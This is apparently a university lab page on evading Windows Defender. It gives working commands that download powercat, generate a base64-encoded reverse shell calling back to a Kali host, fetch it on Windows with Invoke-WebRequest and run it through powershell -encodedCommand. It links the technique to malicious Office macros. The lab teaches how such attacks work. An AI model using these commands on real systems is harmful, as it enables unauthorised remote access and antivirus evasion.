---
layout:
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
---

# Bypassing Windows Defender

## Discussion

Windows Defender is a powerful access control and antivirus software solution. It is updated automatically in the background on Windows systems. Many organizations are using it instead of having to purchase enterprise antivirus solutions which is just one more product to keep track of for security professionals. It also has a feature that will send a file that is not signed with a certificate to Microsoft servers for analysis. It will alert and delete the offending file.

Threat actors take advantage of a variety of methods to bypass Windows Defender and other antivirus solutions.

## Lab Preparation

1. You need your Windows 10 system
2. Kali should be on your WAN segment (because of the reverse backdoor and it is the c2 server)
3.  Start a listener with Metasploit

    ```
        a. **use exploit/multi/handler**

        b. **Set PAYLOAD cmd/unix/reverse_netcat**

        c. Set the LHOST to your Kali IP

        d. Set the LPORT to **4433**

        e. Check your options to be sure it looks good

        f. Run: **exploit**
    ```

## Start the lab

Open a new terminal in your Kali workstation. Become the root user:

**sudo su -**

Run the following command and change **KALI\_IP** to your Kali IP:

pwsh -c "iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1') ; powercat -c **KALI\_IP** -p **4433** -e cmd.exe -ge" > /var/www/html/backup.bat

The commands above uses Powershell for Linux (**pwsh**) to download (**iex**) a file from a remote server (**New-Object System.Net.Webclient**)**.DownloadString**). The file it downloads is Powercat. Powercat is a Powershell version of ncat like the labs you did earlier in the semester. The semicolon separates commands. The next command it is going to run is to set the IP of your Kali machine and set the Port number to connect to it and execute cmd.exe when someone connects (**-e cmd.exe**). It will generate the code to connect to your Kali server, but it will encode the commands using base64 (**-ge**). Base64 is an encoding format that is generally used to convert binary data to ASCII or standard characters. The generated payload will be save do the web root (\*\* > /var/www/html/backup.bat\*\*)

***

## Base64

Below is a quick tutorial on Base64 encoding.

> **Base64 Exercise:**

```
Open a new Kali terminal.

Run the command:

**echo hello | base64**

You should see:  **aGVsbG8K**

Note how the output is a string of text.  If you look at your partner’s, you’ll see they have the exact same output from running the command.

Now to decode the base64 back to the text “hello” run:

**echo aGVsbG8K** | **base64 -d**

**-d means to decode**.

Note how it is back to the normal “hello” text.

Base64 is used by threat actors to hide their activity. Note, however, you can decode it when you detect it.
```

***

## Back to the bypassing defender Lab

Run the command:

**cat /var/www/html/backup.bat**

That is a lot of base64 encoding. The full output of the encoding can be decoded with:

**cat /var/www/html/backup.bat | base64 -d**

The output is the Windows (and Linux) scripting language called Powershell.

Check to be sure your Metasploit listener is running.

## Windows 10

Switch to your Windows 10 workstation. Remember the WinSCP file that you created?

Download it to your Windows 10 computer and run it.

What happens?

Defender is catching it as soon as it downloads so it won’t work as expected. This is where threat actors have to get creative.

## The Bypass

**NOTE: As you perform this part of the lab, what you are doing is what happens behind the scenes when someone injects malicious code into a Word document, PDF document, or some other code injection. When someone clicks the “Enable Macros” these commands will run. These exact commands can be used or a variation of the commands.**

Click on the start menu and type:

**powershell**

Then hit Enter.

That will put you in a Powershell prompt. The prompt will start with PS and have a blue background.

**e.g.**

![example](https://i.imgur.com/zSPdUJC.png)

Run the following command (The command is all one line and change **KALI\_IP** to your Kali IP):

**Invoke-webrequest -URI 'http://KALI\_IP/backup.bat' -outfile 'C:\ProgramData\backup.bat'**

Check to be sure the file downloaded with the command:

**Get-Content C:\ProgramData\backup.bat**

The output look familiar when you ran it on Linux?

Now run the command:

**powershell.exe -encodedCommand (Get-Content 'c:\ProgramData\backup.bat' -raw)**

The powershell command above decodes the base64 encoding (**-encodedCommand**) and opens the file and reads the contents (**Get-Content 'c:\ProgramData\backup.bat’**)

**Switch back to your Kali workstation** and give it a moment and you’ll see the Windows Prompt on your Windows 10 workstation.

This is one method attackers use to inject malicious code inside Word, Excel, or Powerpoint document and obtain a remote shell. If you hear about a “malicious macro,” the macro is running commands very similar to what you did. The same commands you type do work, but threat actors will change commands to try and avoid detection.

I’ll leave it up to you to learn to create a Word Macro and try the commands above. In your own time.

For the macro to work, you’ll want to combine these commands to make it easier.

**Submission:**

Create a screenshot showing the IP address of the Windows 10 from the reverse shell.
